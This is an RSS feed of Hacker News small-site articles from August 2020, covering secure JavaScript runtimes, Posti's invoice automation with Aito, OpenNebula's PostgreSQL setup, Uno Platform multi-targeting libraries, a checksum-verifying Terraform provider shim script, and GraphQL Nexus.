<a name="impractical-constraints"></a>
</p><h3><a href="#impractical-constraints">#</a>Impractical Constraints</h3>

<p>The third argument is that the security requirements are simply too much of a constraint on JavaScript and its ecosystems. That there exists no path from the ecosystems today to this kind of secure ecosystem. As a result, secure runtimes will always be a fringe effort
  adopted by the few who can invest in the time and effort to support them.

</p><p>This, I believe, is the most crucial problem to solve. The ability to run third-party libraries with less risk should be fully democratized.

<a name="secure-modular-runtime-proposal"></a>
</p><h2><a href="#secure-modular-runtime-proposal">#</a>Secure Modular Runtime Proposal</h2>

<p>I'd like to propose a hypothetical runtime for JavaScript, as a strawman, and to invite scrutiny as to whether this solves the following problems:

</p><ol>
<li>That this runtime can fully restrict high-level capability access from packages for third-party code running in the same process than we have in Node.js, Deno and browsers today.
</li><li>That this runtime can support …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://guybedford.com/secure-modular-runtimes.html">https://guybedford.com/secure-modular-runtimes.html</a></em></p>]]>
            </description>
            <link>https://guybedford.com/secure-modular-runtimes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270195</guid>
            <pubDate>Tue, 25 Aug 2020 11:25:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Finnish logistics giant uses predictive database for intelligent automation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24270164">thread link</a>) | @arauhala
<br/>
August 25, 2020 | https://aito.ai/blog/posti-boosts-their-rpa-with-aito/ | <a href="https://web.archive.org/web/*/https://aito.ai/blog/posti-boosts-their-rpa-with-aito/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Posti boosts purchase invoice automation with Aito</h2><p>The RPA team of Posti has moved to the next level by adding machine learning into their toolbox. Using Aito has allowed Posti to utilize machine learning independently and the first Aito implementation is now live in production, tirelessly churning through thousands of purchase invoices and saving their finance team countless of hours worth of mechanical work.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/posti_quote.png" alt="Aito has provided Posti a fast and easy tool to implement machine learning to business processes, adding new opportunities to our Intelligent Automation toolkit."></p></div></div><h2>Automation in the Finnish logistics giant</h2><p>As the largest postal service operator in Finland, Posti delivers hundreds of thousands of parcels and envelopes daily around the country. This naturally involves much more behind the scenes than just the logistics though, and automation has been at the core of Posti for years.</p><p>To streamline its operations, Posti’s RPA Center of Excellence has been automating countless business processes within the company. With Aito now in their toolbox, the RPA team can conquer even complex processes without having to go through the data science pipeline. No custom code or scripts are needed either since interaction with Aito happens directly through standard UiPath activities.</p><h2>Handling purchase invoices</h2><p>By using Aito and in collaboration with Sisua Digital, Posti has automated their purchase invoice handling processing. Processing the 3000 new invoices every month requires several cognitive decisions, making automation impossible with traditional RPA methods. Before storing the final version in their invoice management system, each digital invoice needs to be:</p><ol><li>Assigned to the right reviewer</li><li>Allocated to the right cost center</li><li>Tagged for the right category</li><li>Corrected in case of missing information</li></ol><p>Visualizing the problem with some mock data, this is how a new invoice looks like entering the system. A correct value needs to be selected for the empty fields.</p><table><thead><tr><th>Vendor_Code</th><th>Inv_Amt</th><th>VAT_Code</th><th>Item_Description</th><th>Product_Category</th><th>Reviewer</th><th>CC_Code</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>VENDOR-1676</td><td>83.24</td><td></td><td>Artworking/Typesetting ...</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>Posti has automated this process by creating a software robot with UiPath and having it interact with Aito. The robot reads the information in each new invoice and asks Aito to predict the right values.</p><table><thead><tr><th>Vendor_Code</th><th>Inv_Amt</th><th>VAT_Code</th><th>Item_Description</th><th>Product_Category</th><th>Reviewer</th><th>CC_Code</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>VENDOR-1676</td><td>83.24</td><td>VAT-24</td><td>Artworking/Typesetting ...</td><td>CLASS-1593</td><td>R-085</td><td>CC-164</td><td></td><td></td><td></td></tr></tbody></table><h2>Launching the robot</h2><p>To test the performance of the new automation, it was first operated in parallel with the manual process for one month and all the predictions of Aito were recorded for evaluation. During the simulation, Aito’s predictions fulfilled the accuracy requirement of 95% set by the project steering group, giving it the green light for production. The first version of the robot includes a few of types of purchase invoices in one legal company. Later during this the fall, more companies and invoice types will be added.</p><p>During its first couple of months in production, more than 7,000 purchase invoices have been processed automatically. The new automation has reduced the workload on the Accounts Payable team at Posti while boosting the speed of invoice review. But even more importantly, the RPA team of Posti now has the ability to replicate the technology for countless other business processes. After the initial learning curve, they found Aito very straightforward to use with standard UiPath functionality.</p><a href="https://aito.ai/blog">Back to blog list</a></div></div>]]>
            </description>
            <link>https://aito.ai/blog/posti-boosts-their-rpa-with-aito/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270164</guid>
            <pubDate>Tue, 25 Aug 2020 11:20:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenNebula announces new experimental support for PostgreSQL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24270048">thread link</a>) | @amarti
<br/>
August 25, 2020 | http://docs.opennebula.io/5.12/deployment/opennebula_installation/postgresql_setup.html | <a href="https://web.archive.org/web/*/http://docs.opennebula.io/5.12/deployment/opennebula_installation/postgresql_setup.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
            
  <div id="postgresql-setup">

<div>
<p>Important</p>
<p>This feature is a <strong>Technology Preview</strong>. It’s not recommended for production environments!</p>
</div>
<p>The PostgreSQL back-end is an alternative to SQLite and MySQL/MariaDB back-ends. All back-ends cannot coexist, and you will have to decide which one is going to be used while planning your OpenNebula installation. It’s not possible to automatically migrate the existing OpenNebula database from SQLite or MySQL/MariaDB to PostgreSQL.</p>
<p>Features:</p>
<ul>
<li>Required <strong>PostgreSQL 9.5 or newer</strong> (WARNING: base RHEL/CentOS 7 contains unsupported PostgreSQL 9.2!)</li>
<li>No migrator for existing deployments from SQLite or MySQL/MariaDB</li>
<li>No full-text search support</li>
</ul>
<div>
<p>Note</p>
<p>If you are planning to install OpenNebula with PostgreSQL back-end, please follow this guide <strong>prior</strong> to starting OpenNebula for the first time to avoid problems with oneadmin and serveradmin credentials.</p>
</div>
<div id="installation">
<h2>Installation<a href="#installation" title="Permalink to this headline">¶</a></h2>
<p>First of all, you need a working PostgreSQL server <strong>version 9.5 or newer</strong>. You can either deploy one for the OpenNebula installation or reuse any existing PostgreSQL already deployed and accessible by the Frontend. We assume you have PostgreSQL server installed and running.</p>
<div id="configuring-postgresql">
<h3>Configuring PostgreSQL<a href="#configuring-postgresql" title="Permalink to this headline">¶</a></h3>
<p>Create new database user <code><span>oneadmin</span></code> and provide own password for database user:</p>
<div><div><pre><span></span>$ sudo -i -u postgres -- createuser -E -P oneadmin
Enter password for new role: **********
Enter it again: **********
</pre></div>
</div>
<p>Create database <code><span>opennebula</span></code> with owner <code><span>oneadmin</span></code>:</p>
<div><div><pre><span></span>$ sudo -i -u postgres -- createdb -O oneadmin opennebula
</pre></div>
</div>
<div>
<p>Note</p>
<p>The database doesn’t need to be created if the database user has privileges to create databases. In that case, OpenNebula creates the database on the first connect. To keep the lowest needed privileges, it’s recommended to follow the steps above and prepare everything beforehand.</p>
</div>
<p>Visit the <a href="https://www.postgresql.org/docs/12/user-manag.html">PostgreSQL documentation</a> to learn how to manage accounts.</p>
<p>Validate a working connection, e.g.:</p>
<div><div><pre><span></span>$ psql -h localhost -U oneadmin opennebula
Password for user oneadmin:
psql (10.12 (Ubuntu 10.12-0ubuntu0.18.04.1))
SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)
Type "help" for help.

opennebula=&gt;
</pre></div>
</div>
<p>If connection above fails, you might need to configure client authentication mechanisms in your PostgreSQL server. Review authentication configuration file <code><span>pg_hba.conf</span></code> in your installation (e.g., located in <code><span>/var/lib/pgsql/data/pg_hba.conf</span></code>, <code><span>/etc/postgresql/$VERSION/main/pg_hba.conf</span></code> where <code><span>$VERSION</span></code> is your major PostgreSQL version). Ensure the file contains:</p>
<div><div><pre><span></span><span># host  DATABASE        USER            ADDRESS                 METHOD  [OPTIONS]</span>
<span>host</span>    <span>opennebula</span>      <span>oneadmin</span>        <span>127.0</span><span>.</span><span>0.1</span><span>/</span><span>32</span>            <span>md5</span>
<span>host</span>    <span>opennebula</span>      <span>oneadmin</span>        <span>::</span><span>1</span><span>/</span><span>128</span>                 <span>md5</span>
</pre></div>
</div>
<p>Reload the PostgreSQL server after the change:</p>
<div><div><pre><span></span>$ sudo systemctl reload postgresql
</pre></div>
</div>
<p>Validate a working connection again.</p>
<p>Visit the <a href="https://www.postgresql.org/docs/12/auth-pg-hba-conf.html">PostgreSQL documentation</a> to learn how to manage client authentication configuration.</p>
</div>
<div id="configuring-opennebula">
<h3>Configuring OpenNebula<a href="#configuring-opennebula" title="Permalink to this headline">¶</a></h3>
<p>Before you run OpenNebula for the first time, you need to set database connection details in <a href="http://docs.opennebula.io/5.12/deployment/references/oned_conf.html#oned-conf"><span>oned.conf</span></a>.</p>
<div><div><pre><span></span><span># Sample configuration for PostgreSQL</span>
<span>DB</span> <span>=</span> <span>[</span> <span>backend</span> <span>=</span> <span>"postgresql"</span><span>,</span>
       <span>server</span>  <span>=</span> <span>"localhost"</span><span>,</span>
       <span>port</span>    <span>=</span> <span>0</span><span>,</span>
       <span>user</span>    <span>=</span> <span>"oneadmin"</span><span>,</span>
       <span>passwd</span>  <span>=</span> <span>"**********"</span><span>,</span>
       <span>db_name</span> <span>=</span> <span>"opennebula"</span> <span>]</span>
</pre></div>
</div>
<p>Fields:</p>
<ul>
<li><strong>server</strong>: of the machine running the PostgreSQL server.</li>
<li><strong>port</strong>: port for the connection to the server. If set to 0, the default port is used.</li>
<li><strong>user</strong>: PostgreSQL user-name.</li>
<li><strong>passwd</strong>: PostgreSQL password.</li>
<li><strong>db_name</strong>: Name of the PostgreSQL database OpenNebula will use.</li>
</ul>
</div>
</div>
<div id="using-opennebula-with-postgresql">
<h2>Using OpenNebula with PostgreSQL<a href="#using-opennebula-with-postgresql" title="Permalink to this headline">¶</a></h2>
<p>After this installation and configuration process you can use OpenNebula as usual.</p>
</div>
</div>


           </div>
          </div></div>]]>
            </description>
            <link>http://docs.opennebula.io/5.12/deployment/opennebula_installation/postgresql_setup.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24270048</guid>
            <pubDate>Tue, 25 Aug 2020 11:02:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Move Uno Platform Pages to a Multi-Targeting Library]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24269958">thread link</a>) | @cfdevelop
<br/>
August 25, 2020 | https://christianfindlay.com/2020/08/25/uno-multitargeting/ | <a href="https://web.archive.org/web/*/https://christianfindlay.com/2020/08/25/uno-multitargeting/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main">

<section id="content">

	<article id="post-1692">

		<div>
			
<p>You can move Uno Platform pages and other code into a multi-targeted library that you can reference from the Uno Platform head projects. This is much more convenient than using Visual Studio Shared libraries. Shared libraries don’t seem to have full support in Visual Studio, and some features like quick refactors often don’t work. This article briefly explains what I did to get this working. I completely removed the shared library in my sample. You can clone my&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://github.com/MelbourneDeveloper/Samples/tree/master/UnoCrossPlatformTemplate">working sample</a>&nbsp;here.&nbsp;</p>



<p>Check out my Udemy course <a href="https://www.udemy.com/course/introduction-to-uno-platform/?referralCode=C9FE308096EADFB5B661" data-type="URL" data-id="https://www.udemy.com/course/introduction-to-uno-platform/?referralCode=C9FE308096EADFB5B661">Introduction To Uno Platform</a>.</p>



<p>This video gives you a quick overview of creating a multi-targeting library and moving a page into it.&nbsp;</p>



<figure><p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/MYEwMvQd9SM?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span>
</p></figure>



<p><a href="https://nicksnettravels.builttoroam.com/uno-crossplatform-template/" data-type="URL" data-id="https://nicksnettravels.builttoroam.com/uno-crossplatform-template/">This article</a> gives you a much more comprehensive step by step guide to converting an existing solution to used a multi-targeting library. Also, this process seems support hot-reload.</p>



<p>The trick is that this template project uses SDK type MSBuild.Sdk.Extras . These types of projects build for all the different platforms mentioned. Here is some of the config in the csproj file. The noteworthy part is the TargetFrameworks. We can’t merely build for .NET Standard. We need libraries for all the platforms we want to target.</p>



<pre data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;PropertyGroup&gt;
&lt;TargetFrameworks&gt;uap10.0.16299;netstandard2.0;xamarinios10;xamarinmac20;MonoAndroid90;monoandroid10.0&lt;/TargetFrameworks&gt;
  &lt;!-- Ensures the .xr.xml files are generated in a proper layout folder --&gt;
  &lt;GenerateLibraryLayout&gt;true&lt;/GenerateLibraryLayout&gt;
  &lt;LangVersion&gt;8.0&lt;/LangVersion&gt;
  &lt;Nullable&gt;enable&lt;/Nullable&gt;
  &lt;TreatWarningsAsErrors&gt;true&lt;/TreatWarningsAsErrors&gt;    
&lt;/PropertyGroup&gt;</pre>



<p>I took the time to add some basic features to the project so that you can get started with Uno Platform development quickly. Also, it gives you Cat Facts! The only extra dependency I have added is to&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://github.com/MelbourneDeveloper/RestClient.Net">RestClient.Net</a>, which the app uses to make Web API calls. These are the features of the project at the time of publishing this article. I will try to update and fix this sample moving into the future.</p>



<ul><li>Current version of Uno Platform (3.0.12)</li><li>C# version 8</li><li>FxCop with my flavor of code rules. This prevents common coding mistakes. Check out the documentation at the&nbsp;<a target="_blank" href="https://github.com/dotnet/roslyn-analyzers" rel="noreferrer noopener">Roslyn Github repo</a>.</li><li>RestClient .Net for APIs</li><li>ViewModel with binding</li><li>ICommands</li><li>Converters</li><li><strong><em>No shared project</em></strong></li><li>Nullable turned on. This a feature of C# 8 to reduce the need for null checking</li></ul>



<p>In Progress</p>



<ul><li>Hot reload doesn’t seem to work. Shout out if you know why!</li><li>There is a build problem on Mac because it cannot build for UWP. Let me know if you know how to ignore this on Mac for Visual Studio</li></ul>



<p>Watch a video of the app:</p>



<figure><p><span><iframe width="760" height="428" src="https://www.youtube.com/embed/oOMvHV1U82w?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span>
</p></figure>



<h2>Wrap-up</h2>



<p>Grab the sample and get started building an app. If you found this information useful, check out my Udemy course&nbsp;<a target="_blank" href="https://www.udemy.com/course/introduction-to-uno-platform/?referralCode=C9FE308096EADFB5B661" rel="noreferrer noopener">Introduction To Uno Platform</a>.</p>
					</div>

		

		

	<!-- .comments -->




		

		
		

		
		
	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
	</article>

</section>

	


</div></div>]]>
            </description>
            <link>https://christianfindlay.com/2020/08/25/uno-multitargeting/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269958</guid>
            <pubDate>Tue, 25 Aug 2020 10:48:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Provider-shims: stopgap solution for using community Terraform providers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24269946">thread link</a>) | @draganm
<br/>
August 25, 2020 | https://numtide.com/articles/generate-terraform-provider-shim/ | <a href="https://web.archive.org/web/*/https://numtide.com/articles/generate-terraform-provider-shim/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="content">
      
<p>Two weeks ago, Hashicorp has announced <a href="https://www.hashicorp.com/blog/announcing-hashicorp-terraform-0-13/">the release of Terraform 0.13.0</a>.
This release automates the installation of third-party providers, which was a major pain point when using such providers until now.
Unfortunately, this solution puts the burden of providing a service implementing <a href="https://www.terraform.io/docs/internals/provider-registry-protocol.html">registry protocol</a> onto the third-party plugin providers.
With time, we expect that most of the community-provided plugins will be available through such registries, but at the moment, most of them are not.</p>
<p>As a stopgap solution, we have implemented a so-called <a href="https://github.com/numtide/generate-terraform-provider-shim">Provider Shim generator</a>.</p>
<h2 id="provider-shims">Provider Shims</h2>
<p>TL;DR: Provider Shim is a <code>bash</code> script that gets placed in the repository, and that downloads, caches and executes the real Terraform provider when accessed.
Due to it's size it's very suitable to be checked along side the Terraform code in source code repositories.</p>
<h2 id="background">Background</h2>
<p>Before we can explain what Provider Shim does, it is crucial to understand what a Terraform provider is and how Terraform interacts with the providers.</p>
<h3 id="what-is-a-terraform-provider">What is a Terraform provider?</h3>
<p>Basic building blocks of Terraform are Resources and Data sources.
Resource is something that is managed (created, updated, destroyed) by Terraform, for example an EC2 instance, or a Storage Bucket in Google Cloud.
On the other hand, Data source is something that is not managed by Terraform per se (for example: GCP VM that has been manually created), but can be queried by Terraform to get information about it (such as public IP address of the said VM).</p>
<p>Terraform itself does not know how to interact with the resources, it only manages information about the resources, and all the operations (create, read, update, destroy) are delegated to so called providers.</p>
<p>Providers are executable files that are started and terminated by Terraform when needed.
Once started, Terraform communicates with a provider through a Unix socket using a <a href="https://github.com/hashicorp/terraform-plugin-sdk/blob/master/internal/tfplugin5/tfplugin5.proto">GRPC protocol</a>.
Providers on their own do not store any state, but are provided by Terraform with the state whenever an operation (such as <code>ReadResource</code>, <code>PlanResourceChange</code>, ..) needs to be performed.</p>
<h3 id="how-does-terraform-gets-its-providers">How does Terraform gets its providers?</h3>
<p>When <code>terraform init</code> is performed, Terraform downloads all the required modules and parses their HCLs (<code>.tf</code> files).
Among other things, HCLs contain <a href="https://www.terraform.io/docs/configuration/provider-requirements.html">provider requirements</a>, describing which versions of providers (and since Terraform 0.13.x locations of the registries) are required.</p>
<p>For each such requirement, Terraform will perform the following steps:</p>
<ul>
<li>Try finding the plugin on the local machine, in the following directories
<ul>
<li>Current directory: <code>.</code> (used mainly for plugin development)</li>
<li>Same directory where <code>terraform</code> binary is located</li>
<li><code>terraform.d/plugins</code></li>
<li><code>.terraform.d/plugins</code></li>
<li><code>~/.terraform.d/plugins</code></li>
</ul>
</li>
<li>If the plugin binary is not available in any of those locations, try downloading the plugin from the registry, storing it in <code>.terraform.d/plugins</code></li>
</ul>
<p>Once <code>terraform init</code> was successful, <code>terraform plan/apply/destroy</code> will be searching for needed plugins in the same directories as the <code>terraform init</code> would search.</p>
<h2 id="what-happens-if-a-provider-is-not-available-through-a-registry">What happens if a provider is not available through a registry?</h2>
<p>Performing <code>terraform init</code> is a really convenient way to install all providers needed by your Terraform project, provided that your provider is available using the provider registry protocol.
If that is not the case, things are getting uggly.</p>
<p>When your Terraform project depends on a community provider that can't be downloaded with <code>terraform init</code>, one has to somehow obtain binary of the provider and put it in the correct path for Terraform to find it.</p>
<p>This is very tedious and error prone manual process that has to be repeated for every provider and every location where Terraform is executed.</p>
<p>To make this easier, one can use one of the relative paths to the root Terraform module (such as <code>terraform.d/plugins</code> or <code>.terraform.d/plugins</code>) and check them in together with the terraform code into source control version.</p>
<p>This leads to repeatable builds with the manual task being done only once, but it also means that the source control contains all the binaries of the providers (each of them being megabytes in size) - working with such source repositories can be very daunting.</p>
<h3 id="provider-shim-saves-the-day">Provider Shim saves the day</h3>
<p>Instead of checking in the binary of a provider, we propose checking in a so called Provider Shim.</p>
<p>Shim is a small Bash script that will check if there is a copy of the provider binary on the local disk, if not, it will download the binary from GitHub and after the binary is available it will start the binary.</p>
<p>Such a shim would be small in size (less than 2 kilobytes) is a Bash script, making it easy to review and debug.</p>
<p>An example of such a Shim looks like this:</p>
<pre><code><span>#!/usr/bin/env bash
#
# Generated by generate-terraform-provider-shim: https://github.com/numtide/generate-terraform-provider-shim
#

</span><span>set </span><span>-e -o</span><span> pipefail

plugin_url</span><span>=</span><span>"https://github.com/numtide/terraform-provider-linuxbox/releases/download/v0.2.2/terraform-provider-linuxbox_v0.2.2_linux_amd64.tar.gz"
</span><span>plugin_unpack_dir</span><span>=</span><span>"${XDG_CACHE_HOME</span><span>:-</span><span>$HOME/.cache}/terraform-providers/linuxbox_v0.2.2"
</span><span>plugin_binary_name</span><span>=</span><span>"terraform-provider-linuxbox_v0.2.2"
</span><span>plugin_binary_path</span><span>=</span><span>"${plugin_unpack_dir}/${plugin_binary_name}"
</span><span>plugin_binary_sha1</span><span>=</span><span>"7232dbb6760d34e844ce731226b9eec67c5bb276"

</span><span>if </span><span>[[ </span><span>! </span><span>-d </span><span>"${plugin_unpack_dir}" </span><span>]]</span><span>; then
    </span><span>mkdir</span><span> -p </span><span>"${plugin_unpack_dir}"
</span><span>fi

if </span><span>[[ </span><span>-f </span><span>"${plugin_binary_path}" </span><span>]]</span><span>; then
    </span><span>current_sha</span><span>=</span><span>$(git hash-object "${plugin_binary_path}")
    </span><span>if </span><span>[[ </span><span>$current_sha </span><span>!= </span><span>"${plugin_binary_sha1}" </span><span>]]</span><span>; then
        </span><span>rm </span><span>"${plugin_binary_path}"
    </span><span>fi
fi

if </span><span>[[ </span><span>! </span><span>-f </span><span>"${plugin_binary_path}" </span><span>]]</span><span>; then
    </span><span>curl</span><span> -sL </span><span>"${plugin_url}" </span><span>| </span><span>tar xzvfC - </span><span>"${plugin_unpack_dir}"
    </span><span>chmod 755 </span><span>"${plugin_binary_path}"
</span><span>fi

</span><span>current_sha</span><span>=</span><span>$(git hash-object "${plugin_binary_path}")
</span><span>if </span><span>[[ </span><span>$current_sha </span><span>!= </span><span>"${plugin_binary_sha1}" </span><span>]]</span><span>; then
    </span><span>echo </span><span>"plugin binary sha does not match ${current_sha} != ${plugin_binary_sha1}" </span><span>&gt;&amp;</span><span>2
    </span><span>exit</span><span> 1
</span><span>fi

</span><span>exec </span><span>"${plugin_binary_path}" </span><span>$@
</span></code></pre><h3 id="what-does-the-provider-shim-do">What does the Provider Shim do?</h3>
<p>Provider Shim performs the following operations:</p>
<ul>
<li>Check if the binary of the provider is available in <code>~/.cache/terraform-providers</code>.</li>
<li>If there is no binary available, use <code>curl</code> to fetch an archive of the binary from the release in GitHub.</li>
<li>When fetched, extract the binary from the archive.</li>
<li>Check the integrity of the binary against a known SHA1 of the binary.
This step will detect if someone has replaced the binary of the provider in the GitHub release or on the local disk.</li>
<li>If the SHA1 matches, <code>exec</code> the provider giving it the same ARGs that shim has received, which will replace the <code>bash</code> process with the process of the provider binary.</li>
</ul>
<h3 id="what-happens-when-terraform-finds-the-provider-shim-at-the-right-place">What happens when Terraform finds the Provider Shim at the right place?</h3>
<p>Once terraform executes the Provider Shim instead of the provider, Provider Shim will (if needed) download the binary of the provider and start the provider.</p>
<p>All of this is transparent for Terraform, as if the provider binary was directly executed.</p>
<p>The only noticeable difference is the wait time for the fetching of the provider over the network using <code>curl</code>.
This happens only once, after that provider binary is cached on the local disk and won't be downloaded again.</p>
<h2 id="generating-provider-shims">Generating Provider Shims</h2>
<p>Generating such Provider Shims manually is a repetitive task that can be easily automated.
For this purpose, we have implemented a <a href="https://github.com/numtide/generate-terraform-provider-shim">command line utility</a> to generate such shims.</p>
<p>In order to generate shims for your terraform project, execute <code>generate-terraform-provider-shim &lt;provider path&gt;</code> in the directory of your root Terraform module.
Required <code>&lt;provider path&gt;</code> argument is the <code>&lt;owner&gt;/&lt;project&gt;</code> GitHub path of the project of the provider.</p>
<p>By default, <code>generate-terraform-provider-shim</code> will find latest release of the provider and generate a shim for it in <code>terraform.d/</code> directory for each arch supported by the provider.</p>
<p>If a specific version is required, an argument <code>--version=&lt;semver matcher&gt;</code> can be provided.</p>
<p>Generated Provider Shim can (and should be checked in together with the Terraform code)</p>
<p>Since version 0.2.0, the shim generator will generate shims in proper paths for both Terraform <code>0.12.x</code> and <code>0.13.x</code>, making it a great tool for a smooth transition to Terraform <code>0.13.x</code>.</p>
<h2 id="limitations">Limitations</h2>
<p>Like every hack, Provider Shims come with a set of limitations.
We are aware of the following constraints for using Provider Shims:</p>
<h3 id="dependencies">Dependencies</h3>
<p>Due to it's nature, Provider Shims have number of dependencies that have to be installed on the system in order for it to work.
Fortunately, most of those dependencies are available on many Unix-like systems.</p>
<p>Here is the list of dependencies:</p>
<ul>
<li><code>bash</code>: Provider Shims are <code>bash</code> scripts relying on <code>bash</code> internal commands.</li>
<li><code>curl</code>: used for fetching archives of the community provider.</li>
<li><code>unzip</code> or <code>gzip</code>/<code>tar</code>: depending on the archive type used in the provider release, either unzip or <code>tar</code>/<code>gzip</code> are required.</li>
<li><code>git</code>: we took an unorthodox approach to use <code>git</code> internal command to calculate SHA1 of the provider binary. Rational behind this: most of the time Terraform projects are stored in <code>git</code> repositories, hence <code>git</code> will be available.</li>
</ul>
<h3 id="only-providers-with-binaries-attached-to-the-github-releases-are-supported">Only providers with binaries attached to the GitHub releases are supported</h3>
<p>We are relying on the developers of the provider to create releases with attached compiled binaries of the providers for different architectures.
If that is not the case, a Provider Shim cannot be generated.</p>
<h3 id="only-tar-gz-and-zip-archives-are-supported">Only .tar.gz and .zip archives are supported</h3>
<p>There is no standard way of packaging providers.
Most of the time they are packaged in a Zip or Gzipped Tar archive - those are formats we are supporting.</p>
<h3 id="windows-is-not-supported">Windows is not supported</h3>
<p>We do not have access to a Windows machine and have never run terraform in a Windows environment, hence the generated shims will definitely not work under Windows.</p>
<h3 id="can-t-be-executed-in-terraform-cloud">Can't be executed in Terraform Cloud</h3>
<p>Since VMs used in Terraform cloud are lacking numerous <a href="https://numtide.com/articles/generate-terraform-provider-shim/#Dependencies">dependencies</a> (most notably: <code>curl</code>), Provider Shims cannot be used in <code>Remote</code> execution mode of Terraform Cloud.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Provider Shims can be very useful in Terraform <code>0.12.x</code> world and also can be useful for the …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://numtide.com/articles/generate-terraform-provider-shim/">https://numtide.com/articles/generate-terraform-provider-shim/</a></em></p>]]>
            </description>
            <link>https://numtide.com/articles/generate-terraform-provider-shim/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24269946</guid>
            <pubDate>Tue, 25 Aug 2020 10:46:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Code-first GraphQL server by Prisma]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24269944">thread link</a>) | @oczek
<br/>
August 25, 2020 | https://blog.graphqleditor.com/graphql-nexus-codefirst-graphql-server/ | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/graphql-nexus-codefirst-graphql-server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>GraphQL schema is a set of rules describing the functionality available to the client, including specification of operations (queries and mutations) that can be executed to execute against your data graph. When building a GraphQL service, there is a choice that needs to be made whether you want to follow the code-first or schema-first path: </p>
<ul>
<li>Schema-first - which prioritizes process of designing the schema which puts schema as your source of truth and forces your code to follow the definitions stored in your schema,</li>
<li>Code-first (resolver-first) - is an approach where the GraphQL schema is implemented programmatically.</li>
</ul>
<p>In either case, we will end up with a fully functional GraphQL service, but this choice will influence your project in terms of the amount of work you will need to put to introduce some features (but it’s a topic that deserves to be covered in a separate post).</p>
<h2>Code-first framework for GraphQL Server development</h2>
<p>The rapid growth of GraphQL’s popularity generated the natural need for different tools, both schema-first and code-first oriented, facilitating GraphQL working experience. One of the tools representing the code-first approach is <a href="https://nexus.js.org/">GraphQL Nexus framerwork</a>.</p>
<p>GraphQL Nexus is a GraphQL framework for building your GraphQL Server, where the schema is defined and implemented programmatically. GraphQL Nexus relies on a Node.js and TypeScript thanks to which it can provide features such as:</p>
<ul>
<li><strong>Type-Safety</strong> -  type-definitions are being generated as you proceed with the development process &amp; inferred in your code, providing you with auto-completion and error catching,</li>
<li><strong>Compatibility with GraphQL Ecosystem</strong> - GraphQL Nexus relies heavily on graphql-js and works well with its existing types when constructing the schema which makes the auto-generated schema compatible with most popular tools like Apollo Server etc.,</li>
<li><strong>Data-Agnostic</strong> - GraphQL Nexus is a declarative syntax layered on the top of the graphql-js library which basically means that you can achieve with it all that you can do with graphql-js or apollo-tools.</li>
</ul>
<p>Having figured out all the types you need for your schema all you need to do is simply use <code>makeSchema</code> function to create the schema instance that would be used as the foundation for your GraphQL server.</p>
<div data-language="tsx"><pre><code><span>const</span> schema <span>=</span> <span>makeSchema</span><span>(</span><span>{</span>
  
  types<span>:</span> <span>[</span>User<span>,</span> Query<span>,</span> Mutation<span>]</span><span>,</span>

  
  outputs<span>:</span> <span>{</span>
    typegen<span>:</span> __dirname <span>+</span> <span>'/generated/typings.ts'</span><span>,</span>
    schema<span>:</span> __dirname <span>+</span> <span>'/generated/schema.graphql'</span><span>,</span>
  <span>}</span><span>,</span>

  
  nonNullDefaults<span>:</span> <span>{</span>
    input<span>:</span> <span>true</span><span>,</span>
    output<span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span>

</code></pre></div>
<h2>Getting started</h2>
<p>As previously mentioned GraphQL Nexus relies heavily on <code>graphql-js</code> and it’s also required for the installation:</p>
<div data-language="text"><pre><code>npm install nexus
npm install graphql # required as a peer dependency</code></pre></div>
